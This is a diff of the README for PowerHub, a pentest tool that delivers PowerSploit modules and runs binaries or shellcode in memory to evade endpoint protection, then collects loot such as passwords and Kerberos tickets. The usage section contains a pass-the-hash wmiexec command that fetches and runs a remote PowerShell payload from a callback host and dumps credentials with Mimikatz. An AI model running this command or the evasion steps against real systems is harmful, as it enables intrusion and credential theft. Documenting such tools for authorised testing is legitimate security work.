@@ -4,11 +4,22 @@ PowerHub
 PowerHub is a web application which aids a pentester in transferring files,
 in particular code which may get flagged by endpoint protection.
 
-
 ![PowerHub Webapp](https://github.com/AdrianVollmer/PowerHub/blob/master/img/powerhub-webapp.png)
 
-The web application is made with Flask and consists of three parts.
+During an engagement where you have a test client available, one of the
+first things you want to do is run PowerSploit. So you need to download the
+files, messing with endpoint protection, disable the execution policy, etc.
+This provides an (almost) one-click-solution for this. Oh, and you can also
+run arbitrary binaries (PE and shell code) entirely in-memory using
+PowerSploit's modules.
 
+Your loot (Kerberos tickets, passwords, etc.) can be easily transferred
+back either as a file or a text snippet.
+
+How it works
+============
+
+The web application is made with Flask and consists of three parts.
 
 The Hub
 -------
@@ -19,7 +30,7 @@ can be executed directly from memory with
 `Invoke-ReflectivePEInjection`.
 
 Modules have to be placed in `./modules` and can be either PowerShell
-scripts, PE executables, or shellcode. You can load them on the target via
+scripts, PE executables, or shell code. You can load them on the target via
 PowerShell with `Load-HubModule`. Run `Help-PowerHub` for more information.
 
 PowerHub on the attacker system simply looks for `*.ps1` or `*.exe` files.
@@ -27,12 +38,14 @@ They need to be in their respective directory, though, so `exe` files need
 to be in `modules/exe` (or at least symlinked), and so forth. The `*.ps1`
 files are imported on the target via `[Scriptblock]::Create()`.
 
+A simple interface to install modules is provided for your convenience.
+
 The Clipboard
 -------------
 
 The clipboard functionality is meant for exchanging small snippets, such as
 hashes, passwords, one-liners, and so forth. It's like an extremely basic
-etherpad or a guest book, but non-persistent.
+[Etherpad](https://etherpad.org/) or a guest book, but non-persistent.
 
 The File Exchange
 -----------------
@@ -46,7 +59,7 @@ Usage
 PowerHub has two mandatory arguments: the first is the callback host (can be
 an IP address) and the second is either `--auth <user>:<pass>` or
 `--no-auth`. The latter disables basic authentication which is *not
-recommended*. This hostname is used by the stager to download the payload.
+recommended*. This host name is used by the stager to download the payload.
 If the callback port or path differ from the default, it can also be
 changed.
 
@@ -63,7 +76,7 @@ endpoint protection tools:
 ```
 wmiexec.py -hashes :deadbeef0000000000000000deadbeef \
     ./administrator@10.0.1.4  \
-    'powershell -c "$K=new-object net.webclient;IEX $K.downloadstring(\"http://10.0.100.13:8000/ps\"); Load-Hubmodule 11 ; Invoke-Mimikatz -DumpCreds "'
+    'powershell -c "$K=new-object net.webclient;IEX $K.downloadstring(\"http://10.0.100.13:8000/0\"); Load-Hubmodule Mimikatz ; Invoke-Mimikatz -DumpCreds "'
 ```
 
 Author
